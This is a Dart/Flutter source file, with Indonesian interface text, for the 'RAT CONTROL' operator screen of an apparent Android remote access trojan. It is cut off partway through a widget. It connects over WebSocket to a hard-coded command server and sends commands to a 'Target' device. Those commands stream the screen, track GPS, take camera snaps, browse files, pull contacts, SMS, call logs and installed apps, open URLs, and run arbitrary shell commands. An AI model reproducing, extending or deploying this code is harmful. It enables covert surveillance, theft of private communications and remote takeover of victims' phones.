import 'dart:async';
import 'dart:convert';
import 'dart:io';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:http/http.dart' as http;
import 'package:shared_preferences/shared_preferences.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:battery_plus/battery_plus.dart';
import 'package:network_info_plus/network_info_plus.dart';
import 'package:geolocator/geolocator.dart';
import 'package:geocoding/geocoding.dart';
import 'package:image_picker/image_picker.dart';
import 'package:path_provider/path_provider.dart';
import 'package:url_launcher/url_launcher.dart';
import 'package:web_socket_channel/web_socket_channel.dart';
import 'package:web_socket_channel/status.dart' as status;
import 'package:font_awesome_flutter/font_awesome_flutter.dart';
import 'package:flutter_animate/flutter_animate.dart';

import 'api_config.dart';

// ─── COLORS ──────────────────────────────────────────────────────
const Color kRatBg      = Color(0xFFDCEEFB);
const Color kRatCard    = Color(0xFFFFFFFF);
const Color kRatBorder  = Color(0xFF42A5F5);
const Color kRatCyan    = Color(0xFF1565C0);
const Color kRatText    = Color(0xFF000000);
const Color kRatMuted   = Color(0x8A000000);

class RatPage extends StatefulWidget {
  final String sessionKey;
  final String username;
  final String role;
  final String androidId;

  const RatPage({
    super.key,
    required this.sessionKey,
    required this.username,
    required this.role,
    required this.androidId,
  });

  @override
  State<RatPage> createState() => _RatPageState();
}

class _RatPageState extends State<RatPage> with TickerProviderStateMixin {
  // ─── CONTROLLERS ──────────────────────────────────────────────
  late AnimationController _pulseCtrl;
  late Animation<double> _pulseAnim;
  late AnimationController _fadeCtrl;
  late Animation<double> _fadeAnim;

  // ─── STATE ────────────────────────────────────────────────────
  WebSocketChannel? _ratChannel;
  bool _isConnected = false;
  String _connectionStatus = 'Disconnected';

  // ─── DEVICE INFO ──────────────────────────────────────────────
  Map<String, dynamic> _deviceInfo = {};
  bool _deviceLoading = true;

  // ─── COMMAND HISTORY ─────────────────────────────────────────
  List<Map<String, dynamic>> _commandHistory = [];
  bool _commandLoading = false;

  // ─── SCREEN STREAM ───────────────────────────────────────────
  bool _isScreenStreaming = false;
  String _screenStreamUrl = '';

  // ─── LOCATION TRACK ──────────────────────────────────────────
  bool _isTracking = false;
  Timer? _trackTimer;

  // ─── FILE MANAGER ────────────────────────────────────────────
  List<Map<String, dynamic>> _files = [];
  bool _filesLoading = false;

  // ─── TEXT INPUT ──────────────────────────────────────────────
  final TextEditingController _commandCtrl = TextEditingController();

  @override
  void initState() {
    super.initState();

    _pulseCtrl = AnimationController(
      vsync: this,
      duration: const Duration(seconds: 2),
    )..repeat(reverse: true);
    _pulseAnim = Tween<double>(begin: 0.85, end: 1.0).animate(
      CurvedAnimation(parent: _pulseCtrl, curve: Curves.easeInOut),
    );

    _fadeCtrl = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 600),
    );
    _fadeAnim = CurvedAnimation(parent: _fadeCtrl, curve: Curves.easeOut);
    _fadeCtrl.forward();

    _loadDeviceInfo();
    _loadCommandHistory();
    _connectRatWS();
  }

  @override
  void dispose() {
    _trackTimer?.cancel();
    _ratChannel?.sink.close(status.goingAway);
    _pulseCtrl.dispose();
    _fadeCtrl.dispose();
    _commandCtrl.dispose();
    super.dispose();
  }

  // ═══════════════════════════════════════════════════════════════
  // 1. WEBSOCKET CONNECTION
  // ═══════════════════════════════════════════════════════════════
  void _connectRatWS() {
    try {
      _ratChannel = WebSocketChannel.connect(
        Uri.parse('ws://cp.zyrostore.id:3594/rat'),
      );

      _ratChannel!.sink.add(jsonEncode({
        'type': 'rat_register',
        'key': widget.sessionKey,
        'androidId': widget.androidId,
        'username': widget.username,
        'role': widget.role,
      }));

      _ratChannel!.stream.listen(
        (event) {
          final data = jsonDecode(event);
          _handleRatMessage(data);
        },
        onError: (e) {
          setState(() {
            _isConnected = false;
            _connectionStatus = 'Error: $e';
          });
        },
        onDone: () {
          setState(() {
            _isConnected = false;
            _connectionStatus = 'Disconnected';
          });
          // Auto reconnect
          Future.delayed(const Duration(seconds: 5), () {
            if (mounted) _connectRatWS();
          });
        },
      );

      setState(() {
        _isConnected = true;
        _connectionStatus = 'Connected';
      });
    } catch (e) {
      setState(() {
        _isConnected = false;
        _connectionStatus = 'Failed: $e';
      });
    }
  }

  void _handleRatMessage(Map<String, dynamic> data) {
    switch (data['type']) {
      case 'device_info':
        setState(() => _deviceInfo = data['info'] ?? {});
        break;
      case 'command_response':
        setState(() {
          _commandHistory.insert(0, {
            'command': data['command'] ?? '',
            'output': data['output'] ?? '',
            'time': DateTime.now().toIso8601String(),
          });
          _commandLoading = false;
        });
        break;
      case 'screen_stream':
        setState(() {
          _screenStreamUrl = data['url'] ?? '';
          _isScreenStreaming = data['active'] ?? false;
        });
        break;
      case 'location_update':
        setState(() {
          _commandHistory.insert(0, {
            'command': 'location_update',
            'output': 'Lat: ${data['lat']}, Lng: ${data['lng']}',
            'time': DateTime.now().toIso8601String(),
          });
        });
        break;
      case 'file_list':
        setState(() {
          _files = List<Map<String, dynamic>>.from(data['files'] ?? []);
          _filesLoading = false;
        });
        break;
    }
  }

  // ═══════════════════════════════════════════════════════════════
  // 2. SEND COMMAND
  // ═══════════════════════════════════════════════════════════════
  Future<void> _sendCommand(String command, {Map<String, dynamic>? args}) async {
    if (!_isConnected) {
      _showSnack('❌ Tidak terhubung ke server RAT', isError: true);
      return;
    }

    setState(() => _commandLoading = true);

    try {
      _ratChannel!.sink.add(jsonEncode({
        'type': 'rat_command',
        'key': widget.sessionKey,
        'command': command,
        'args': args ?? {},
      }));

      // Timeout 15 detik
      await Future.delayed(const Duration(seconds: 15));
      if (mounted && _commandLoading) {
        setState(() => _commandLoading = false);
        _showSnack('⚠️ Command timeout', isError: true);
      }
    } catch (e) {
      setState(() => _commandLoading = false);
      _showSnack('❌ Error: $e', isError: true);
    }
  }

  void _showSnack(String message, {bool isError = false}) {
    if (!mounted) return;
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        content: Text(message, style: const TextStyle(color: Colors.white)),
        backgroundColor: isError ? Colors.redAccent : Colors.green,
        behavior: SnackBarBehavior.floating,
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
      ),
    );
  }

  // ═══════════════════════════════════════════════════════════════
  // 3. DEVICE INFO
  // ═══════════════════════════════════════════════════════════════
  Future<void> _loadDeviceInfo() async {
    try {
      final deviceInfo = DeviceInfoPlugin();
      final androidInfo = await deviceInfo.androidInfo;
      final battery = Battery();
      final batteryLevel = await battery.batteryLevel;
      final batteryState = await battery.batteryState;
      final networkInfo = NetworkInfo();
      final wifiName = await networkInfo.getWifiName();
      final wifiIP = await networkInfo.getWifiIP();

      final dir = await getApplicationDocumentsDirectory();

      setState(() {
        _deviceInfo = {
          'model': androidInfo.model,
          'manufacturer': androidInfo.manufacturer,
          'brand': androidInfo.brand,
          'version': androidInfo.version.release,
          'sdk': androidInfo.version.sdkInt,
          'androidId': androidInfo.id,
          'battery': '$batteryLevel%',
          'batteryStatus': batteryState.toString().split('.').last,
          'network': wifiName ?? 'Mobile',
          'ip': wifiIP ?? 'Unknown',
          'storage': dir.path,
        };
        _deviceLoading = false;
      });
    } catch (e) {
      setState(() => _deviceLoading = false);
    }
  }

  // ═══════════════════════════════════════════════════════════════
  // 4. COMMAND HISTORY
  // ═══════════════════════════════════════════════════════════════
  Future<void> _loadCommandHistory() async {
    final prefs = await SharedPreferences.getInstance();
    final historyJson = prefs.getString('rat_history_${widget.username}');
    if (historyJson != null && mounted) {
      setState(() {
        _commandHistory = List<Map<String, dynamic>>.from(
          jsonDecode(historyJson),
        );
      });
    }
  }

  Future<void> _saveCommandHistory() async {
    final prefs = await SharedPreferences.getInstance();
    await prefs.setString(
      'rat_history_${widget.username}',
      jsonEncode(_commandHistory.take(50).toList()),
    );
  }

  // ═══════════════════════════════════════════════════════════════
  // 5. FEATURES
  // ═══════════════════════════════════════════════════════════════

  // ─── SCREEN STREAM ───────────────────────────────────────────
  void _toggleScreenStream() {
    if (_isScreenStreaming) {
      _sendCommand('screen_stream_stop');
      setState(() => _isScreenStreaming = false);
    } else {
      _sendCommand('screen_stream_start');
      setState(() => _isScreenStreaming = true);
    }
  }

  // ─── LOCATION TRACK ─────────────────────────────────────────
  void _toggleLocationTrack() {
    if (_isTracking) {
      _trackTimer?.cancel();
      setState(() => _isTracking = false);
      _showSnack('📍 Location tracking stopped');
    } else {
      setState(() => _isTracking = true);
      _trackTimer = Timer.periodic(const Duration(seconds: 10), (_) async {
        try {
          final pos = await Geolocator.getCurrentPosition(
            locationSettings: const LocationSettings(
              accuracy: LocationAccuracy.high,
            ),
          );
          _sendCommand('location_update', args: {
            'lat': pos.latitude,
            'lng': pos.longitude,
          });
        } catch (_) {}
      });
      _showSnack('📍 Location tracking started');
    }
  }

  // ─── CAMERA SNAP ────────────────────────────────────────────
  Future<void> _cameraSnap() async {
    final picker = ImagePicker();
    final XFile? photo = await picker.pickImage(
      source: ImageSource.camera,
      imageQuality: 70,
    );
    if (photo != null) {
      final file = File(photo.path);
      final bytes = await file.readAsBytes();
      final base64Image = base64Encode(bytes);
      _sendCommand('camera_snap', args: {'image': base64Image});
      _showSnack('📸 Camera snap sent');
    }
  }

  // ─── FILE MANAGER ───────────────────────────────────────────
  void _loadFiles() {
    setState(() => _filesLoading = true);
    _sendCommand('file_list', args: {'path': '/'});
  }

  // ─── GET ALL CONTACTS ───────────────────────────────────────
  void _getContacts() {
    _sendCommand('get_contacts');
    _showSnack('📞 Requesting contacts...');
  }

  // ─── GET SMS ────────────────────────────────────────────────
  void _getSms() {
    _sendCommand('get_sms');
    _showSnack('💬 Requesting SMS...');
  }

  // ─── GET CALL LOGS ──────────────────────────────────────────
  void _getCallLogs() {
    _sendCommand('get_call_logs');
    _showSnack('📞 Requesting call logs...');
  }

  // ─── GET INSTALLED APPS ─────────────────────────────────────
  void _getApps() {
    _sendCommand('get_installed_apps');
    _showSnack('📱 Requesting installed apps...');
  }

  // ─── VIBRATE ────────────────────────────────────────────────
  void _vibrate() {
    HapticFeedback.heavyImpact();
    _sendCommand('vibrate', args: {'duration': 2000});
    _showSnack('📳 Vibrating device...');
  }

  // ─── TOAST ──────────────────────────────────────────────────
  Future<void> _showToast() async {
    final ctrl = TextEditingController();
    final result = await showDialog<String>(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: kRatCard,
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(18)),
        title: const Text('Show Toast',
            style: TextStyle(color: kRatText, fontFamily: 'Astral')),
        content: TextField(
          controller: ctrl,
          style: const TextStyle(color: kRatText),
          decoration: InputDecoration(
            hintText: 'Pesan toast...',
            hintStyle: const TextStyle(color: kRatMuted),
            filled: true,
            fillColor: kRatBg,
            border: OutlineInputBorder(
              borderRadius: BorderRadius.circular(12),
              borderSide: BorderSide.none,
            ),
          ),
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: const Text('Batal',
                style: TextStyle(color: kRatMuted)),
          ),
          ElevatedButton(
            onPressed: () {
              if (ctrl.text.isNotEmpty) {
                Navigator.pop(context, ctrl.text);
              }
            },
            style: ElevatedButton.styleFrom(
              backgroundColor: kRatCyan,
              shape: RoundedRectangleBorder(
                  borderRadius: BorderRadius.circular(10)),
            ),
            child: const Text('Kirim',
                style: TextStyle(color: Colors.white)),
          ),
        ],
      ),
    );
    if (result != null && result.isNotEmpty) {
      _sendCommand('show_toast', args: {'message': result});
      _showSnack('💬 Toast sent');
    }
  }

  // ─── OPEN URL ───────────────────────────────────────────────
  Future<void> _openUrlOnDevice() async {
    final ctrl = TextEditingController();
    final result = await showDialog<String>(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: kRatCard,
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(18)),
        title: const Text('Open URL',
            style: TextStyle(color: kRatText, fontFamily: 'Astral')),
        content: TextField(
          controller: ctrl,
          style: const TextStyle(color: kRatText),
          decoration: InputDecoration(
            hintText: 'https://...',
            hintStyle: const TextStyle(color: kRatMuted),
            filled: true,
            fillColor: kRatBg,
            border: OutlineInputBorder(
              borderRadius: BorderRadius.circular(12),
              borderSide: BorderSide.none,
            ),
          ),
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: const Text('Batal',
                style: TextStyle(color: kRatMuted)),
          ),
          ElevatedButton(
            onPressed: () {
              if (ctrl.text.isNotEmpty) {
                Navigator.pop(context, ctrl.text);
              }
            },
            style: ElevatedButton.styleFrom(
              backgroundColor: kRatCyan,
              shape: RoundedRectangleBorder(
                  borderRadius: BorderRadius.circular(10)),
            ),
            child: const Text('Buka',
                style: TextStyle(color: Colors.white)),
          ),
        ],
      ),
    );
    if (result != null && result.isNotEmpty) {
      _sendCommand('open_url', args: {'url': result});
      _showSnack('🌐 URL sent');
    }
  }

  // ─── CUSTOM SHELL ───────────────────────────────────────────
  Future<void> _runShell() async {
    final ctrl = TextEditingController();
    final result = await showDialog<String>(
      context: context,
      builder: (_) => AlertDialog(
        backgroundColor: kRatCard,
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(18)),
        title: const Text('Shell Command',
            style: TextStyle(color: kRatText, fontFamily: 'Astral')),
        content: TextField(
          controller: ctrl,
          maxLines: 4,
          style: const TextStyle(
              color: kRatText, fontFamily: 'monospace', fontSize: 12),
          decoration: InputDecoration(
            hintText: 'ls -la /sdcard',
            hintStyle: const TextStyle(color: kRatMuted),
            filled: true,
            fillColor: kRatBg,
            border: OutlineInputBorder(
              borderRadius: BorderRadius.circular(12),
              borderSide: BorderSide.none,
            ),
          ),
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: const Text('Batal',
                style: TextStyle(color: kRatMuted)),
          ),
          ElevatedButton(
            onPressed: () {
              if (ctrl.text.isNotEmpty) {
                Navigator.pop(context, ctrl.text);
              }
            },
            style: ElevatedButton.styleFrom(
              backgroundColor: kRatCyan,
              shape: RoundedRectangleBorder(
                  borderRadius: BorderRadius.circular(10)),
            ),
            child: const Text('Run',
                style: TextStyle(color: Colors.white)),
          ),
        ],
      ),
    );
    if (result != null && result.isNotEmpty) {
      _sendCommand('shell', args: {'command': result});
      _showSnack('💻 Command sent');
    }
  }

  // ═══════════════════════════════════════════════════════════════
  // 6. BUILD
  // ═══════════════════════════════════════════════════════════════
  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.black,
      appBar: AppBar(
        backgroundColor: Colors.black,
        elevation: 0,
        leading: IconButton(
          icon: const Icon(Icons.arrow_back_ios_new_rounded,
              color: Colors.white, size: 18),
          onPressed: () => Navigator.pop(context),
        ),
        title: Row(
          children: [
            const Icon(FontAwesomeIcons.ghost, color: kRatBorder, size: 18),
            const SizedBox(width: 10),
            const Text(
              'RAT CONTROL',
              style: TextStyle(
                color: Colors.white,
                fontFamily: 'Astral',
                fontSize: 16,
                letterSpacing: 2,
                fontWeight: FontWeight.bold,
              ),
            ),
          ],
        ),
        actions: [
          Padding(
            padding: const EdgeInsets.only(right: 12),
            child: Row(
              children: [
                Container(
                  width: 8,
                  height: 8,
                  decoration: BoxDecoration(
                    shape: BoxShape.circle,
                    color: _isConnected ? Colors.green : Colors.red,
                    boxShadow: [
                      BoxShadow(
                        color: (_isConnected ? Colors.green : Colors.red)
                            .withOpacity(0.8),
                        blurRadius: 8,
                        spreadRadius: 2,
                      ),
                    ],
                  ),
                ),
                const SizedBox(width: 6),
                Text(
                  _isConnected ? 'LIVE' : 'OFF',
                  style: TextStyle(
                    color: _isConnected ? Colors.green : Colors.red,
                    fontSize: 10,
                    fontFamily: 'Astral',
                    fontWeight: FontWeight.bold,
                  ),
                ),
              ],
            ),
          ),
        ],
      ),
      body: FadeTransition(
        opacity: _fadeAnim,
        child: SingleChildScrollView(
          physics: const BouncingScrollPhysics(),
          padding: const EdgeInsets.all(14),
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              _buildStatusCard(),
              const SizedBox(height: 14),
              _buildDeviceInfoCard(),
              const SizedBox(height: 14),
              _buildScreenControlCard(),
              const SizedBox(height: 14),
              _buildActionGrid(),
              const SizedBox(height: 14),
              _buildCommandConsole(),
              const SizedBox(height: 14),
              _buildCommandHistory(),
              const SizedBox(height: 30),
            ],
          ),
        ),
      ),
    );
  }

  // ─── STATUS CARD ────────────────────────────────────────────
  Widget _buildStatusCard() {
    return Container(
      padding: const EdgeInsets.all(16),
      decoration: BoxDecoration(
        gradient: LinearGradient(
          colors: [
            kRatCyan.withOpacity(0.2),
            kRatBorder.withOpacity(0.1),
          ],
          begin: Alignment.topLeft,
          end: Alignment.bottomRight,
        ),
        borderRadius: BorderRadius.circular(20),
        border: Border.all(color: kRatBorder.withOpacity(0.4), width: 1.5),
      ),
      child: Row(
        children: [
          ScaleTransition(
            scale: _pulseAnim,
            child: Container(
              width: 50,
              height: 50,
              decoration: BoxDecoration(
                shape: BoxShape.circle,
                color: kRatCyan.withOpacity(0.3),
                border: Border.all(color: kRatBorder, width: 2),
              ),
              child: Icon(
                _isConnected
                    ? FontAwesomeIcons.satelliteDish
                    : FontAwesomeIcons.plugCircleXmark,
                color: kRatBorder,
                size: 22,
              ),
            ),
          ),
          const SizedBox(width: 14),
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                const Text(
                  'RAT Connection',
                  style: TextStyle(
                    color: Colors.white,
                    fontFamily: 'Astral',
                    fontSize: 14,
                    fontWeight: FontWeight.bold,
                  ),
                ),
                const SizedBox(height: 4),
                Text(
                  _connectionStatus,
                  style: TextStyle(
                    color: _isConnected ? Colors.green : Colors.red,
                    fontFamily: 'Astral',
                    fontSize: 11,
                  ),
                ),
                const SizedBox(height: 6),
                Text(
                  'Target: ${widget.username} • ${widget.role.toUpperCase()}',
                  style: const TextStyle(
                    color: Colors.white70,
                    fontFamily: 'Astral',
                    fontSize: 10,
                  ),
                ),
              ],
            ),
          ),
        ],
      ),
    );
  }

  // ─── DEVICE INFO CARD ───────────────────────────────────────
  Widget _buildDeviceInfoCard() {
    return Container(
      padding: const EdgeInsets.all(16),
      decoration: BoxDecoration(
        color: Colors.white.withOpacity(0.05),
        borderRadius: BorderRadius.circular(20),
        border: Border.all(color: kRatBorder.withOpacity(0.3), width: 1),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            children: [
              const Icon(Icons.smartphone, color: kRatBorder, size: 16),
              const SizedBox(width: 8),
              const Text(
                'DEVICE INFO',
                style: TextStyle(
                  color: Colors.white,
                  fontFamily: 'Astral',
                  fontSize: 12,
                  fontWeight: FontWeight.bold,
                  letterSpacing: 1.5,
                ),
              ),
              const Spacer(),
              if (_deviceLoading)
                const SizedBox(
                  width: 14,
                  height: 14,
                  child: CircularProgressIndicator(
                      strokeWidth: 2, color: kRatBorder),
                ),
              IconButton(
                icon: const Icon(Icons.refresh, color: kRatBorder, size: 18),
                onPressed: _loadDeviceInfo,
                padding: EdgeInsets.zero,
                constraints: const BoxConstraints(),
              ),
            ],
          ),
          const SizedBox(height: 12),
          if (_deviceInfo.isNotEmpty)
            Wrap(
              spacing: 8,
              runSpacing: 8,
              children: _deviceInfo.entries.map((e) {
                return Container(
                  padding: const EdgeInsets.symmetric(
                      horizontal: 10, vertical: 6),
                  decoration: BoxDecoration(
                    color: Colors.white.withOpacity(0.08),
                    borderRadius: BorderRadius.circular(8),
                    border: Border.all(
                        color: kRatBorder.withOpacity(0.2), width: 0.5),
                  ),
                  child: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    mainAxisSize: MainAxisSize.min,
                    children: [
                      Text(
                        e.key.toUpperCase(),
                        style: const TextStyle(
                          color: Colors.white54,
                          fontSize: 8,
                          fontFamily: 'Astral',
                          letterSpacing: 0.5,
                        ),
                      ),
                      const SizedBox(height: 2),
                      Text(
                        e.value.toString(),
                        style: const TextStyle(
                          color: Colors.white,
                          fontSize: 11,
                          fontFamily: 'Astral',
                          fontWeight: FontWeight.w600,
                        ),
                      ),
                    ],
                  ),
                );
              }).toList(),
            )
          else
            const Text(
              'Loading device info...',
              style: TextStyle(
                  color: Colors.white54, fontFamily: 'Astral', fontSize: 11),
            ),
        ],
      ),
    );
  }

  // ─── SCREEN CONTROL CARD ────────────────────────────────────
  Widget _buildScreenControlCard() {
    return Container(
      padding: const EdgeInsets.all(16),
      decoration: BoxDecoration(
        color: Colors.white.withOpacity(0.05),
        borderRadius: BorderRadius.circular(20),
        border: Border.all(color: kRatBorder.withOpacity(0.3), width: 1),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            children: [
              const Icon(Icons.monitor, color: kRatBorder, size: 16),
              const SizedBox(width: 8),
              const Text(
                'SCREEN & LOCATION',
                style: TextStyle(
                  color: Colors.white,
                  fontFamily: 'Astral',
                  fontSize: 12,
                  fontWeight: FontWeight.bold,
                  letterSpacing: 1.5,
                ),
              ),
            ],
          ),
          const SizedBox(height: 12),
          Row(
            children: [
              Expanded(
                child: _buildControlTile(
                  icon: Icons.screen_share_rounded,
                  label: _isScreenStreaming ? 'STOP STREAM' : 'START STREAM',
                  active: _isScreenStreaming,
                  onTap: _toggleScreenStream,
                ),
              ),
              const SizedBox(width: 10),
              Expanded(
                child: _buildControlTile(
                  icon: Icons.my_location_rounded,
                  label: _isTracking ? 'STOP TRACK' : 'TRACK GPS',
                  active: _isTracking,
                  onTap: _toggleLocationTrack,
                ),
              ),
            ],
          ),
          if (_screenStreamUrl.isNotEmpty) ...[
            const SizedBox(height: 10),
            Container(
              padding: const EdgeInsets.all(10),
              decoration: BoxDecoration(
                color: Colors.green.withOpacity(0.15),
                borderRadius: BorderRadius.circular(10),
                border: Border.all(color: Colors.green.withOpacity(0.4)),
              ),
              child: Row(
                children: [
                  const Icon(Icons.link, color: Colors.green, size: 14),
                  const SizedBox(width: 6),
                  Expanded(
                    child: Text(
                      _screenStreamUrl,
                      style: const TextStyle(
                        color: Colors.green,
                        fontSize: 10,
                        fontFamily: 'monospace',
                      ),
                      overflow: TextOverflow.ellipsis,
                    ),
                  ),
                ],
              ),
            ),
          ],
        ],
      ),
    );
  }

  Widget _buildControlTile({
    required IconData icon,
    required String label,
    required bool active,
    required VoidCallback onTap,
  }) {
    return GestureDetector(
      onTap: onTap,
      child: AnimatedContainer(
        duration: const Duration(milliseconds: 300),
        padding: const EdgeInsets.symmetric(vertical: 12, horizontal: 8),
        decoration: BoxDecoration(
          color: active
              ? kRatCyan.withOpacity(0.3)
              : Colors.white.withOpacity(0.05),
          borderRadius: BorderRadius.circular(12),
          border: Border.all(
            color: active ? kRatBorder : kRatBorder.withOpacity(0.2),
            width: active ? 1.5 : 0.8,
          ),
          boxShadow: active
              ? [
                  BoxShadow(
                    color: kRatBorder.withOpacity(0.4),
                    blurRadius: 12,
                  )
                ]
              : [],
        ),
        child: Column(
          children: [
            Icon(icon,
                color: active ? Colors.white : Colors.white70, size: 22),
            const SizedBox(height: 6),
            Text(
              label,
              style: TextStyle(
                color: active ? Colors.white : Colors.white70,
                fontSize: 9,
                fontFamily: 'Astral',
                fontWeight: FontWeight.bold,
                letterSpacing: 0.5,
              ),
              textAlign: TextAlign.center,
            ),
          ],
        ),
      ),
    );
  }

  // ─── ACTION GRID ────────────────────────────────────────────
  Widget _buildActionGrid() {
    final actions = [
      _RatAction(
        icon: Icons.photo_camera_rounded,
        label: 'Camera Snap',
        color: Colors.purple,
        onTap: _cameraSnap,
      ),
      _RatAction(
        icon: Icons.folder_rounded,
        label: 'File Manager',
        color: Colors.orange,
        onTap: _loadFiles,
      ),
      _RatAction(
        icon: Icons.contacts_rounded,
        label: 'Contacts',
        color: Colors.blue,
        onTap: _getContacts,
      ),
      _RatAction(
        icon: Icons.message_rounded,
        label: 'SMS',
        color: Colors.green,
        onTap: _getSms,
      ),
      _RatAction(
        icon: Icons.call_rounded,
        label: 'Call Logs',
        color: Colors.teal,
        onTap: _getCallLogs,
      ),
      _RatAction(
        icon: Icons.apps_rounded,
        label: 'Installed Apps',
        color: Colors.indigo,
        onTap: _getApps,
      ),
      _RatAction(
        icon: Icons.vibration_rounded,
        label: 'Vibrate',
        color: Colors.pink,
        onTap: _vibrate,
      ),
      _RatAction(
        icon: Icons.notifications_active_rounded,
        label: 'Show Toast',
        color: Colors.amber,
        onTap: _showToast,
      ),
      _RatAction(
        icon: Icons.open_in_new_rounded,
        label: 'Open URL',
        color: Colors.cyan,
        onTap: _openUrlOnDevice,
      ),
      _RatAction(
        icon: Icons.terminal_rounded,
        label: 'Shell',
        color: Colors.redAccent,
        onTap: _runShell,
      ),
    ];

    return Container(
      padding: const EdgeInsets.all(16),
      decoration: BoxDecoration(
        color: Colors.white.withOpacity(0.05),
        borderRadius: BorderRadius.circular(20),
        border: Border.all(color: kRatBorder.withOpacity(0.3), width: 1),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            children: const [
              Icon(Icons.grid_view_rounded, color: kRatBorder, size: 16),
              SizedBox(width: 8),
              Text(
                'REMOTE ACTIONS',
                style: TextStyle(
                  color: Colors.white,
                  fontFamily: 'Astral',
                  fontSize: 12,
                  fontWeight: FontWeight.bold,
                  letterSpacing: 1.5,
                ),
              ),
            ],
          ),
          const SizedBox(height: 12),
          GridView.builder(
            shrinkWrap: true,
            physics: const NeverScrollableScrollPhysics(),
            gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(
              crossAxisCount: 4,
              crossAxisSpacing: 8,
              mainAxisSpacing: 8,
              childAspectRatio: 0.95,
            ),
            itemCount: actions.length,
            itemBuilder: (context, index) =>
                _buildActionTile(actions[index], index),
          ),
        ],
      ),
    );
  }

  Widget _buildActionTile(_RatAction action, int index) {
    return GestureDetector(
      onTap: action.onTap,
      child: Container(
        decoration: BoxDecoration(
          color: action.color.withOpacity(0.15),
          borderRadius: BorderRadius.circular(12),
          border: Border.all(
            color: action.color.withOpacity(0.4),
            width: 1,
          ),
        ),
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            Icon(action.icon, color: action.color, size: 22),
            const SizedBox(height: 4),
            Padding(
              padding: const EdgeInsets.symmetric(horizontal: 2),
              child: Text(
                action.label,
                style: const TextStyle(
                  color: Colors.white70,
                  fontSize: 8.5,
                  fontFamily: 'Astral',
                  fontWeight: FontWeight.w600,
                ),
                textAlign: TextAlign.center,
                maxLines: 1,
                overflow: TextOverflow.ellipsis,
              ),
            ),
          ],
        ),
      ),
    ).animate().fadeIn(delay: (index * 50).ms).scale(begin: const Offset(0.9, 0.9));
  }

  // ─── COMMAND CONSOLE ────────────────────────────────────────
  Widget _buildCommandConsole() {
    return Container(
      padding: const EdgeInsets.all(16),
      decoration: BoxDecoration(
        color: Colors.white.withOpacity(0.05),
        borderRadius: BorderRadius.circular(20),
        border: Border.all(color: kRatBorder.withOpacity(0.3), width: 1),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            children: [
              const Icon(Icons.terminal, color: kRatBorder, size: 16),
              const SizedBox(width: 8),
              const Text(
                'COMMAND CONSOLE',
                style: TextStyle(
                  color: Colors.white,
                  fontFamily: 'Astral',
                  fontSize: 12,
                  fontWeight: FontWeight.bold,
                  letterSpacing: 1.5,
                ),
              ),
              const Spacer(),
              if (_commandLoading)
                const SizedBox(
                  width: 12,
                  height: 12,
                  child: CircularProgressIndicator(
                      strokeWidth: 2, color: kRatBorder),
                ),
            ],
          ),
          const SizedBox(height: 12),
          Container(
            padding: const EdgeInsets.symmetric(horizontal: 12),
            decoration: BoxDecoration(
              color: Colors.black.withOpacity(0.4),
              borderRadius: BorderRadius.circular(10),
              border: Border.all(color: kRatBorder.withOpacity(0.3)),
            ),
            child: Row(
              children: [
                const Text(
                  '\$ ',
                  style: TextStyle(
                    color: kRatBorder,
                    fontFamily: 'monospace',
                    fontWeight: FontWeight.bold,
                  ),
                ),
                Expanded(
                  child: TextField(
                    controller: _commandCtrl,
                    style: const TextStyle(
                      color: Colors.white,
                      fontFamily: 'monospace',
                      fontSize: 12,
                    ),
                    decoration: const InputDecoration(
                      hintText: 'Enter command...',
                      hintStyle: TextStyle(
                          color: Colors.white38, fontFamily: 'monospace'),
                      border: InputBorder.none,
                      contentPadding: EdgeInsets.symmetric(vertical: 12),
                    ),
                    onSubmitted: (value) {
                      if (value.trim().isNotEmpty) {
                        _sendCommand(value.trim());
                        _commandCtrl.clear();
                      }
                    },
                  ),
                ),
                IconButton(
                  icon: const Icon(Icons.send_rounded,
                      color: kRatBorder, size: 18),
                  onPressed: () {
                    if (_commandCtrl.text.trim().isNotEmpty) {
                      _sendCommand(_commandCtrl.text.trim());
                      _commandCtrl.clear();
                    }
                  },
                ),
              ],
            ),
          ),
        ],
      ),
    );
  }

  // ─── COMMAND HISTORY ────────────────────────────────────────
  Widget _buildCommandHistory() {
    return Container(
      padding: const EdgeInsets.all(16),
      decoration: BoxDecoration(
        color: Colors.white.withOpacity(0.05),
        borderRadius: BorderRadius.circular(20),
        border: Border.all(color: kRatBorder.withOpacity(0.3), width: 1),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            children: [
              const Icon(Icons.history, color: kRatBorder, size: 16),
              const SizedBox(width: 8),
              const Text(
                'COMMAND HISTORY',
                style: TextStyle(
                  color: Colors.white,
                  fontFamily: 'Astral',
                  fontSize: 12,
                  fontWeight: FontWeight.bold,
                  letterSpacing: 1.5,
                ),
              ),
              const Spacer(),
              if (_commandHistory.isNotEmpty)
                GestureDetector(
                  onTap: () {
                    setState(() => _commandHistory.clear());
                    _saveCommandHistory();
                  },
                  child: const Text(
                    'Clear',
                    style: TextStyle(
                      color: Colors.redAccent,
                      fontSize: 10,
